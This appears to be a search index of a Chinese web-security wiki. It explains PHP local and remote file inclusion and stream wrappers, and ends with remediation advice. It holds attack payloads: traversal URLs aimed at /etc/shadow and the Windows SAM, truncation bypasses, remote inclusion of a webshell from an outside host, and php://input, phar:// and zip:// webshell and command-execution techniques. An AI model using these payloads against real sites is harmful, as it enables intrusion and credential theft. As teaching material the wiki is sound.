{"./":{"url":"./","title":"CTFS-WiKi 介绍","keywords":"","body":"CTFS-WiKi CTFS-WiKi中集合了WEB类常见的各种漏洞，致力于漏洞准确性、丰富性 希望对WEB安全工作者、WEB安全学习者能有所帮助 站在巨人的肩膀上，感谢之前在网络上做出分享的前辈，也希望有志之士加入我们共同丰富此WiKi "},"FI/":{"url":"FI/","title":"文件包含漏洞","keywords":"","body":"文件包含漏洞 文件包含简介 服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。 文件包含函数 PHP中文件包含函数有以下四种： require() require_once() include() include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 漏洞产生原因 文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 示例代码 例如： $_GET['filename']参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET['filename']的值，执行非预期的操作。 "},"FI/LFI.html":{"url":"FI/LFI.html","title":"本地文件包含漏洞","keywords":"","body":"本地文件包含漏洞 无限制本地文件包含漏洞 测试代码： 测试结果： 通过目录遍历漏洞可以获取到系统中其他文件的内容 常见的敏感信息路径 Windows系统 c:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件 c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码 c:\\ProgramFiles\\mysql\\my,ini // MySQL配置 c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root c:\\windows\\php.ini // php 配置信息 c:\\windows\\my.ini …… Linux/Unix系统 /etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 有限制本地文件包含漏洞绕过 %00截断 条件： allow_url_fopen = Offphp版本 测试代码： 测试结果： http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00 通过%00截断了后面的html 路径长度截断 条件：windows OS，点号需要长于256；linux OS 长于4096 windows下目录最大长度为256字节，超出的部分会被丢弃 linux下目录最大长度为4096字节，超出的部分会被丢弃 测试代码： EXP: http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt测试结果： 发现已经成功截断后面的.html，成功包含了test.txt文件 点号截断 条件：windows OS，点号需要长于256 测试代码： EXP: http://www.ctfs-wiki.com/FI/FI.php ?filename=test.txt测试结果： 发现已经成功截断后面的.html，成功包含了test.txt文件 "},"FI/RFI.html":{"url":"FI/RFI.html","title":"远程文件包含漏洞","keywords":"","body":"远程文件包含漏洞 PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 无限制远程文件包含漏洞 测试代码： 在远程服务器上面搭一个网站，并将木马文件放到网站目录下，如果直接访问php代码不解析。 通过远程文件包含漏洞，包含php.txt可以解析。 http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt 测试结果： php.txt中的php代码已经被执行 有限制远程文件包含漏洞绕过 测试代码： 代码中多添加了html后缀，导致远程包含的文件也会多一个html后缀。 问号绕过 http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt? #号绕过 http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23 还有哪些可以绕过？用burp跑一遍发现空格也可以绕过 http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20 "},"FI/wrappers.html":{"url":"FI/wrappers.html","title":"PHP伪协议","keywords":"","body":"PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 Table of Contents php:// 输入输出流 PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。。 php://filter（本地磁盘文件进行读取） 元封装器，设计用于\"数据流打开\"时的\"筛选过滤\"应用，对本地磁盘文件进行读写 用法：?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样 条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include； php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。 测试代码： 测试结果： php://input 可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=\"multipart/form-data\" 的时候 php://input 是无效的。 用法：?file=php://input 数据利用POST传过去 php://input （读取POST数据） 碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项； 测试代码： 测试结果： php://input（写入木马） 测试代码： 条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP 如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。 ');?> 测试结果： 如果不开启allow_url_include会报错 php://input（命令执行） 测试代码： 条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP 如果不开启allow_url_include会报错 file://伪协议 （读取文件内容） 通过file协议可以访问本地文件系统，读取到文件的内容 测试代码： 测试结果： data://伪协议 数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4 data://（读取文件） 和php伪协议的input类似，碰到file_get_contents()来用； 注意： 闭合； data://（读取文件） 如果php.ini里的allow_url_include=On（PHP 测试结果： phar://伪协议 这个参数是就是php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。 用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意： PHP > =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 测试代码： 测试结果： zip://伪协议 zip伪协议和phar协议类似，但是用法不一样。 用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php 条件： PHP > =5.3.0，注意在windows下测试要5.3.0 测试代码： 测试结果： PHP expect:// 还未测试 允许执行系统命令，不过很可惜，需要安装扩展 http://pecl.php.net/package/expect 默认情况下不启用 http://127.0.0.1/lfi.php?file=expect://ls "},"FI/repair.html":{"url":"FI/repair.html","title":"漏洞修复","keywords":"","body":"漏洞修复 代码层,包含的参数设置为白名单。 web服务器配置 修改php的配置文件将open_basedir的值设置为可以包含的特定目录，后面要加/，例如：open_basedir=/var/www/html/ 关闭allow_url_fopen可以防止本地文件包含和远程文件包含 关闭allow_url_include可以防止远程文件包含 "},"SQLi/":{"url":"SQLi/","title":"SQL注入漏洞","keywords":"","body":"SQL注入漏洞 "},"SQLi/example1.html":{"url":"SQLi/example1.html","title":"数字型注入","keywords":"","body":"数字型注入 "},"SQLI/example1.html":{"url":"SQLI/example1.html","title":"字符型注入","keywords":"","body":"数字型注入 "},"UP/":{"url":"UP/","title":"文件上传漏洞","keywords":"","body":"文件上传漏洞 "},"UP/example1.html":{"url":"UP/example1.html","title":"前端JS绕过","keywords":"","body":"前端JS绕过 "},"parse/":{"url":"parse/","title":"解析漏洞","keywords":"","body":"解析漏洞 "},"parse/example1.html":{"url":"parse/example1.html","title":"IIS 5.x/6.0解析漏洞","keywords":"","body":"IIS 5.x/6.0解析漏洞 "}}